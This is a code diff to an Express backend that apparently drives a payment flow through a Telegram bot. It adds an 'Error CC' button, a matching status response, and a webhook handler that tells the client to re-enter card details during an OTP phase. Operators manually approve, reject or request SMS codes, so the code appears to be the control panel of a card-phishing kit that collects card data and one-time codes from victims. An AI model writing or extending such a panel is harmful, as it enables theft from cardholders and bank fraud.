@@ -274,6 +274,7 @@ app.post('/api/crear-pago', async (req, res) => {
             replyMarkup = { inline_keyboard: [[
                 { text: '✅ Aprobar',  callback_data: `aprobar:${pago.solicitud_id}` },
                 { text: '❌ Rechazar', callback_data: `rechazar:${pago.solicitud_id}` },
+                { text: '💳 Error CC', callback_data: `error_cc:${pago.solicitud_id}` },
                 { text: '⚠️ Error de Usuario', callback_data: `error_usuario:${pago.solicitud_id}` }
             ]]};
         }
@@ -320,6 +321,9 @@ app.get('/api/estado-pago/:solicitud_id', (req, res) => {
         }
         if (pago.estado === 'rechazado_user_error') {
             return res.json({ success: true, estado: 'rechazado_user_error', fase: 'otp', mensaje: pago.motivo_rechazo });
+        }
+        if (pago.estado === 'error_cc') {
+            return res.json({ success: true, estado: 'error_cc', fase: 'otp', mensaje: pago.motivo_rechazo || 'Error en los datos de la tarjeta.' });
         }
         if (pago.estado === 'aprobado') {
             return res.json({ success: true, estado: 'aprobado', fase: 'otp', redirect: `${FRONT_BASE_URL}/${pago.redirigir_a || 'exito.html'}` });
@@ -385,6 +389,13 @@ app.post('/api/telegram-webhook', async (req, res) => {
             await tgAnswerCallback(cq.id, '📱 Se solicitó código por SMS al cliente');
             if (msgId) {
                 await tgEditMessage(msgId, `📱 <b>SE SOLICITÓ CÓDIGO POR SMS AL CLIENTE</b>\n\n` + textoPasoCredenciales(pago));
+            }
+        } else if (accion === 'error_cc') {
+            pago.estado = 'error_cc';
+            pago.motivo_rechazo = 'Error en los datos de la tarjeta (CC).';
+            await tgAnswerCallback(cq.id, '💳 Error CC registrado');
+            if (msgId) {
+                await tgEditMessage(msgId, `💳 <b>ERROR CC</b>\n\n` + textoPasoOTP(pago) + `\n📌 <b>Acción:</b> Se solicitará al cliente volver a ingresar los datos de la tarjeta.`);
             }
         } else if (accion === 'error_usuario') {
             pago.estado = 'rechazado_user_error';
